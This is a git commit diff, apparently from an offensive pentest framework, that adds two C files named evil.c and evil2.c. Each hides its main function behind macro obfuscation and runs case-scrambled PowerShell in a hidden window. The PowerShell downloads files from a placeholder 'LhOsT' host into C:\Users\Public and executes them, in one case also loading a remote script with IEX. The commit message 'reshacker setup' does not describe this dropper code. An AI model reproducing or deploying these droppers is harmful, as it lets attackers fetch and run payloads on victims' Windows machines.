dd0a72189ac608536c2685a4baecaa7e8b5c6bed
Ｋｅｎｎｅｄｙ <ferdi.kennedy@protonmail.com>
2019-12-07 17:13:06 +0700

    Add reshacker setup

---
+++ bin/evil.c
@@ -0,0 +1,19 @@
+/*
+Author: pedro ubuntu [ r00t-3xp10it ]
+Credits: null byte [ Method POC ]
+*/
+
+#include<stdio.h>
+#include<stdlib.h>
+#include<winsock2.h>
+#include<windows.h>
+
+#define _____(i,s,o,g,r,a,m)(i##r##s##o)
+#define _ _____(m,i,n,u,a,l,s)
+
+int _()
+{
+  system("PoWeRsHeLl -wIn 1 -C (nEw-ObJeCt NeT.WebClIeNt).dOwNlOaDfIlE('http://LhOsT/ScRee', 'C:\\Users\\Public\\ScRee') & pOwErShElL -wIn 1 -c C:\\Users\\Public\\ScRee & pOwErShElL -wIn 1 -c \"IEX (NeW-oBjEcT nEt.WeBClIeNt).DoWnLoAdStRiNg('http://LhOsT/payload.EhLh')\"");
+  return 0;
+}
+
---
+++ bin/evil2.c
@@ -0,0 +1,20 @@
+/*
+Author: pedro ubuntu [ r00t-3xp10it ]
+Credits: mascerano [ exe execution ]
+Credits: null byte [ Method POC ]
+*/
+
+#include<stdio.h>
+#include<stdlib.h>
+#include<winsock2.h>
+#include<windows.h>
+
+#define _____(i,s,o,g,r,a,m)(i##r##s##o)
+#define _ _____(m,i,n,u,a,l,s)
+
+int _()
+{
+ system("PoWeRsHeLl -wIN 1 -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://LhOsT/ScRee', 'C:\\Users\\Public\\ScRee') & sTaRt C:\\Users\\Public\\ScRee & pOwErShElL -wIN 1 -C (NeW-oBjEcT nEt.WeBClIeNt).dOwNlOaDfIlE('http://LhOsT/payload.EhLh', 'C:\\Users\\Public\\payload.EhLh') & StArT C:\\Users\\Public\\payload.EhLh");
+  return 0;
+}
+
